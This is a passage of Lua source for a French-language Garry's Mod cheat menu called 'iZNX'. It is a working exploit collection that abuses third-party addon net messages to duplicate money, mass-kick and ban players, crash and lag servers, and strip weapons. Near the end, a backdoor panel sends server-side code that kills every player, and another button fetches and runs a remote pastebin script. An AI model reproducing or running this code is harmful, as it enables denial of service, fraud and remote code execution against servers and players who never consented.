{ typ = "func", name = "Kick", func = function()
if !timer.Exists( "kickallnoob" ) then
iZNX.ChatText( "Kick tout le monde lancé" )
timer.Create( "kickallnoob", 0.05, 0, function()
for i = 1, 2000 do
iZNX.NetStart("DL_Answering")
net.SendToServer()
end
end)
else
timer.Remove( "kickallnoob" )
iZNX.ChatText( "Kick tout le monde stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Kick 1", {
desc = "Exploit pour kick les Admins",
severity = 3,
scan = function() return iZNX.ValidNetString( "plyWarning" ) end,
functions = {
{ typ = "players", addr = "l_players_listing255" },
{ typ = "func", name = "Kick", func = function()
local t = iZNX.GetStored( "l_players_listing255", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart('plyWarning')          
net.WriteEntity(v)          
net.WriteString('You have to select a player before doing a action.')      
net.SendToServer()
iZNX.ChatText("Tentative de kick sur ".. v:Nick().. "!")
end
end, },
},
} )
iZNX.AddExploit( "NLR Freeze", {
desc = "Exploit pour freeze des joueurs",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLR.ActionPlayer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing45" },
{ typ = "func", name = "Freeze", func = function()
local t = iZNX.GetStored( "l_players_listing45", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end  
end, },
},
} )
iZNX.AddExploit( "Supprimer les props 1", {
desc = "Supprimer touts les props du serveur x)",
severity = 2,
scan = function() return iZNX.ValidNetString( "timebombDefuse" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Hack Keypads", {
desc = "Tu peux mettre Anonymous en photo de profil maintenant.",
severity = 1,
scan = function() return iZNX.ValidNetString( "start_wd_emp" ) end,
functions = {
{ typ = "func", name = "Hacker", func = function()
iZNX.NetStart("start_wd_emp")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Kart System €", {
desc = "Exploit d'argent.",
severity = 3,
scan = function() return iZNX.ValidNetString( "kart_sell" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for i=1, 300 do
iZNX.NetStart("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Farming Mod €", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "FarmingmodSellItems" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent1" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "FarmingmodSellItems" )
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   iZNX.GetStored( "montant_argent1" ),
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Point Shop €", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "ClickerAddToPoints" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent2" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart("ClickerAddToPoints")
net.WriteInt(iZNX.GetStored( "montant_argent2" ), 32)
net.SendToServer()
end, },
},
} )
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
iZNX.AddExploit( "Body Groups", {
desc = "Changer de skin",
severity = 1,
scan = function() return iZNX.ValidNetString( "bodyman_model_change" ) end,
functions = {
{ typ = "func", name = "Changer", func = function()
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1  
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
iZNX.NetStart("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Hitman X €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "SendMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent666" },
{ typ = "players", addr = "l_players_list" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( -iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
hook.Remove( "HUDPaint", "skhdsakjl")
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Bail Out €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "BailOut" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent16" },
{ typ = "players", addr = "l_player_liste" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( -iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Tow Truck €", {
desc = "Spawn vehicule dépanneur / Exploit d'argent Regarder le vehicule qui possède une amande",
severity = 2,
scan = function() return iZNX.ValidNetString( "TOW_SubmitWarning" ) end,
functions = {
{ typ = "func", name = "Spawn Dépanneuse", func = function()
iZNX.NetStart("TowTruck_CreateTowTruck")
net.SendToServer()
end, },
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent17" },
{ typ = "func", name = "Argent Exploit", func = function()
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("TOW_SubmitWarning")
net.WriteString(LocalPlayer():SteamID())
net.WriteDouble(-iZNX.GetStored( "montant_argent17" ))
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("TOW_PayTheFine")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Fire Truck", {
desc = "Spawn camion de pompier",
severity = 1,
scan = function() return iZNX.ValidNetString( "FIRE_CreateFireTruck" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
iZNX.NetStart("FIRE_CreateFireTruck")
net.SendToServer()    
end, },
},
} )
iZNX.AddExploit( "€ Hit Menu €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "hitcomplete" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent18" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart("hitcomplete")
net.WriteDouble(iZNX.GetStored( "montant_argent18" ))              
net.SendToServer()      
end, },
},
} )
iZNX.AddExploit( "€ HHH €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "hhh_request" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
local plyhhh = LocalPlayer()              
for k,v in pairs(player.GetAll()) do                
dahater = v  
end        
if dahater != plyhhh then      
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
iZNX.NetStart( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
else
iZNX.ChatText( "Cette version de HHH n'est pas exploitable !" )    
end
end, },
},
} )
iZNX.AddExploit( "€ DaHit €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "DaHit" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent20" },
{ typ = "players", addr = "l_players_listdahit" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )              
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )              
net.WriteEntity( v )              
net.WriteEntity( v )              
net.SendToServer()  
end  
end, },
{ typ = "func", name = "Enlever", func = function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )              
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )              
net.WriteEntity( v )              
net.WriteEntity( v )              
net.SendToServer()    
end
end, },
{ typ = "func", name = "Spam Prendre", func = function()
if !timer.Exists( "SHADoWS_exploit_spamdahitprendre" ) then
iZNX.ChatText( "Spam lancé" )
timer.Create( "SHADoWS_exploit_spamdahitprendre", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )              
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )              
net.WriteEntity( v )              
net.WriteEntity( v )              
net.SendToServer()    
end
end)
else
timer.Remove( "SHADoWS_exploit_spamdahitprendre" )
iZNX.ChatText( "Spam stoppé" )
end
end, },
{ typ = "func", name = "Spam Enlever", func = function()
if !timer.Exists( "SHADoWS_exploit_spamdahitenlever" ) then
iZNX.ChatText( "Spam lancé" )
timer.Create( "SHADoWS_exploit_spamdahitenlever", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )              
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )              
net.WriteEntity( v )              
net.WriteEntity( v )              
net.SendToServer()    
end
end)
else
timer.Remove( "SHADoWS_exploit_spamdahitenlever" )
iZNX.ChatText( "Spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Anti-Printer", {
desc = "Appliquez des dommages constants aux Printers à proximité",
severity = 1,
scan = function() return iZNX.ValidNetString( "customprinter_get" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "SHADoWS_exploit_printersmasher" ) then
iZNX.ChatText( "Anti-Printer lancé" )
timer.Create( "SHADoWS_exploit_printersmasher", 0, 0, function()
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
iZNX.NetStart("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end)
else
timer.Remove( "SHADoWS_exploit_printersmasher" )
iZNX.ChatText( "Anti-Printer stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Crash le Serveur", {
desc = "Comme sont nom l'indique niquez moi ce serveur de la",
severity = 3,
scan = function() return iZNX.ValidNetString( "textstickers_entdata" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
iZNX.NetStart( "textstickers_entdata" )
net.WriteUInt( 0xFFFFFFF, 32 )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Munition Gratuit", {
desc = "Vous donne des munition pour toutes vos armes",
severity = 1,
scan = function() return iZNX.ValidNetString( "TCBBuyAmmo" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(GAMEMODE.AmmoTypes) do
iZNX.NetStart("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Advanced Money Printer €", {
desc = "Voler tout l'argent des printers",
severity = 3,
scan = function() return iZNX.ValidNetString( "DataSend" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then    
iZNX.NetStart("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "gBan Ban tout le monde", {
desc = "Exploit pout bannir tout le monde sauf toi ^^, exploit trouvé dans une ancienne version de gBan",
severity = 3,
scan = function() return iZNX.ValidNetString( "gBan.BanBuffer" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(player.GetAll()) do              
if v != LocalPlayer() then      
iZNX.NetStart( "gBan.BanBuffer" )
net.WriteBool( true )
net.WriteInt( 0, 32 )
net.WriteString( "Des poutous partout" )
net.WriteString( v:SteamID() )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #1", {
desc = "L'admin devrait avoir honte de faire payer un VIP.",
severity = 2,
scan = function() return iZNX.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "SHADoWS_exploit_lagsploit1" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SHADoWS_exploit_lagsploit1", 0.02, 0, function()
for k,v in pairs(player.GetAll()) do
iZNX.NetStart( "ATS_WARP_REMOVE_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
iZNX.NetStart( "ATS_WARP_FROM_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
iZNX.NetStart( "ATS_WARP_VIEWOWNER" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
end
end)
else
timer.Remove( "SHADoWS_exploit_lagsploit1" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Console Spam", {
desc = "Supposé être un lag exploit mais ne provoque pas de lags, juste des spams console",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "SHADoWS_exploit_bigspames2" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SHADoWS_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "_u forget your promess forever but sorry you are a friend" )
end
end)
else
timer.Remove( "SHADoWS_exploit_bigspames2" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #2", {
desc = "Clique pour mettre en position croque mcdo le fonda!",
severity = 1,
scan = function() return iZNX.ValidNetString( "Keypad" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "SHADoWS_exploit_lagsploit4" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SHADoWS_exploit_lagsploit4", 0, 0, function()
for i = 1, 1000 do
iZNX.NetStart("Keypad")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "SHADoWS_exploit_lagsploit4" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #3", {
desc = "Faire lag le serveur comme s'il était hébergé en Afrique",
severity = 2,
scan = function() return iZNX.ValidNetString( "CreateCase" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "SHADoWS_exploit_lagsploit5" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SHADoWS_exploit_lagsploit5", 0.02, 0, function()
for i = 1, 300 do
iZNX.NetStart( "CreateCase" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end)
else
timer.Remove( "SHADoWS_exploit_lagsploit5" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #4", {
desc = "Il doit y en avoir des merdes dans ce serveur !",
severity = 2,
scan = function() return iZNX.ValidNetString( "rprotect_terminal_settings" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "SHADoWS_exploit_lagsploit6" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SHADoWS_exploit_lagsploit6", 0.02, 0, function()
for i = 1, 200 do
iZNX.NetStart( "rprotect_terminal_settings" )
net.WriteEntity( LocalPlayer() )
net.SendToServer()
end
end)
else
timer.Remove( "SHADoWS_exploit_lagsploit6" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #5", {
desc = "Faire crash un serveur sans props ? Mkprod en sueur!",
severity = 2,
scan = function() return iZNX.ValidNetString( "StackGhost" ) end,
functions = {
{ typ = "func", name = "Big Lags", func = function()
if !timer.Exists( "SHADoWS_exploit_lagsploit7" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SHADoWS_exploit_lagsploit7", 0.015, 0, function()
for i = 1, 8 do
for k,v in pairs( player.GetAll() ) do
iZNX.NetStart( "StackGhost" )
net.WriteInt(69,32)
net.SendToServer()
end
end
end)
else
timer.Remove( "SHADoWS_exploit_lagsploit7" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Réanimation Exploit", {
desc = "Vous etes automatiquement réanimé après avoir été tué",
severity = 2,
scan = function() return iZNX.ValidNetString( "RevivePlayer" ) end,
functions = {
{ typ = "func", name = "Immortel :)", func = function()
if !timer.Exists( "SHADoWS_exploit_zombie" ) then
iZNX.ChatText( "Tu es Immortel" )
timer.Create( "SHADoWS_exploit_zombie", 0.5, 0, function()
if !LocalPlayer():Alive() then
iZNX.NetStart("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "SHADoWS_exploit_zombie" )
iZNX.ChatText( "Tu es redevenu Mortel!" )
end
end, },
},
} )
iZNX.AddExploit( "Armory Robbery", {
desc = "Prenez les armes de la police à l'armurerie (Vous devez etre proche d'elle), a un temps de recharge de 5 minutes",
severity = 2,
scan = function() return iZNX.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
functions = {
{ typ = "func", name = "Prendre Arme 1", func = function()
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 2", func = function()
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 3", func = function()
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Admin Stick / Porte exploit", {
desc = "Déverrouiller / Verrouiller Porte / Enlever le proprio (vous devez regarder une porte)",
severity = 3,
scan = function() return iZNX.ValidNetString( "fp_as_doorHandler" ) end,
functions = {
{ typ = "func", name = "Déverrouiller", func = function()
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
end, },
{ typ = "func", name = "Verrouiller", func = function()
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
end, },
{ typ = "func", name = "Enlever le Proprio", func = function()
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "SHADoWS Report Spammer", {
desc = "Envoyer des Report sur tout le monde",
severity = 1,
scan = function() return iZNX.ValidNetString( "TransferReport" ) end,
functions = {
{ typ = "func", name = "Report Tout le Monde", func = function()
for k, v in pairs( player.GetAll() ) do
iZNX.NetStart( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "SERVEUR CODER PAR LE Q" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "SAC Crash", {
desc = "Fait instantanément Crash n'importe quel serveur exécutant la simplicité anticheat",
severity = 3,
scan = function() return iZNX.ValidNetString( "SimplicityAC_aysent" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,400 do
tbl[i] = i
end
iZNX.NetStart("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Crash Serveur", {
desc = "Cliquez sur ce bouton pour Crash le serveur instantanément.",
severity = 3,
scan = function() return iZNX.ValidNetString( "pac_to_contraption" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,1000000000 do
tbl[#tbl + 1] = i
end
iZNX.NetStart("pac_to_contraption")
net.WriteTable( tbl )
net.SendToServer()
end, },
},
} )
local function nukeweapon( ent )
if !ent:IsValid() then return end
if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( ent )
net.SendToServer()
ent.LNextNuke = CurTime() + 0.5
end
local function nukeallweapons( tab )
for k, v in pairs( tab ) do
if !v:IsValid() then continue end
if v.LNextNuke and v.LNextNuke > CurTime() then continue end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( v )
net.SendToServer()
end
end
iZNX.AddExploit( "Strip les armes", {
desc = "Supprimer les armes de n'importes qui.",
severity = 3,
scan = function() return iZNX.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
{ typ = "string", name = "Type d'Arme à Strip", default = "*", addr = "stripper_gunz" },
{ typ = "players", addr = "stripper_plyz" },
{ typ = "func", name = "Strip", func = function()
if !timer.Exists( "stripclub" ) then
iZNX.ChatText( "Strip Activé" )
timer.Create( "stripclub", 0.5, 0, function()
local t = iZNX.GetStored( "stripper_plyz", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local gunz = v:GetWeapons()
local findstring = iZNX.GetStored( "stripper_gunz", "*" )
if findstring == "*" then nukeallweapons( gunz ) return end
local findstringtab = string.Explode( ", ", findstring )
for _, g in pairs( gunz ) do
for _, s in pairs( findstringtab ) do
if string.find( string.lower( g:GetClass() ), s ) then
nukeweapon( g )
end
end
end
end
end)
else
timer.Remove( "stripclub" )
iZNX.ChatText( "Strip Desactivé" )
end
end, },
},
} )
function iZNX.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect( 0, 0, w, h )
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.HTXBackdoor( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)))
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(25, 25, 25, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)))
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.HTXCommandeListe()
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.HTXCommandeListe()
if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
iZNX.HTXCommandeSelector = vgui.Create("DFrame")
iZNX.HTXCommandeSelector:SetSize(550,550)
iZNX.HTXCommandeSelector:SetTitle(" ")
iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.HTXCommandeSelector:MakePopup()
iZNX.HTXCommandeSelector.Paint = function( s, w, h )
surface.SetDrawColor( Color(0,0,0, 200) )
surface.DrawRect( 70, 80, 420, h )
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect( 70, 80, w - 130, h - 20 )
surface.SetDrawColor( Color(110,31,23, 150))
surface.DrawOutlinedRect( 70, 80, w - 130, h - 20 )
surface.DrawOutlinedRect( 71, 81, w - 132, h - 22 )
surface.SetDrawColor( Color(255, 255, 255, 200))
draw.DrawText( "COMMANDES HTX", "Trebuchet24", 240, 2, Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
end
local DScrollPanel = vgui.Create( "DScrollPanel", iZNX.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local zilnixestbo1 = vgui.Create("DButton", DScrollPanel)
zilnixestbo1:SetSize( 350, 20 )
zilnixestbo1:SetPos( 100, 175 )
zilnixestbo1:SetText("Tuer tous les joueurs")
zilnixestbo1:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo1.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo1.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo2 = vgui.Create("DButton", DScrollPanel)
zilnixestbo2:SetSize( 350, 20 )
zilnixestbo2:SetPos( 100, 100 )
zilnixestbo2:SetText("SUPER SPAM VISUEL/SONORE 2")
zilnixestbo2:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo2.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor( Color(math.random(0,150),
                      math.random(0,150),
                      math.random(0,150),
                                   150))
surface.DrawRect(0, 0, w, h)
end
zilnixestbo2.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/GvTQvSdV\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
local zilnixestbo3 = vgui.Create("DButton", DScrollPanel )
zilnixestbo3:SetSize( 350, 20 )
zilnixestbo3:SetPos( 100, 250 )
zilnixestbo3:SetText("D꣡nnir tout les bannis")
zilnixestbo3:SetTextColor(Color(255, 255, 255, 255))
zilnixestbo3.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
